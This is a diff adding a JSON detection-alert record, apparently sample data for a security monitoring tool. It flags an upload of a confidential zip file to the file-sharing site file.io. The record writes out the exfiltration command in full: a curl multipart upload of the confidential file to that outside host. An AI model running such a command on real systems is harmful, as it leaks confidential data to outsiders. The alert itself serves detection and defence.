@@ -1,0 +1,21 @@
+{
+  "alert_id": "ARGUS-0002",
+  "detected_at": "2026-10-03T15:12:40-04:00",
+  "rule": {
+    "title": "Tagged data uploaded to external file-sharing host",
+    "id": "argus-cloud-exfil-001",
+    "level": "high",
+    "mitre": ["T1567.002"]
+  },
+  "host": { "name": "WIN11-ENG-11", "os": "Windows 11" },
+  "identity": { "user": "a.kim", "logon_type": "interactive" },
+  "event": {
+    "action": "outbound_upload",
+    "process": "curl.exe",
+    "command_line": "curl -F \"file=@design_specs_CONFIDENTIAL.zip\" https://file.io",
+    "destination_domain": "file.io",
+    "destination_ip": "34.206.0.0",
+    "bytes": 12882911,
+    "file_tag": "CONFIDENTIAL"
+  }
+}
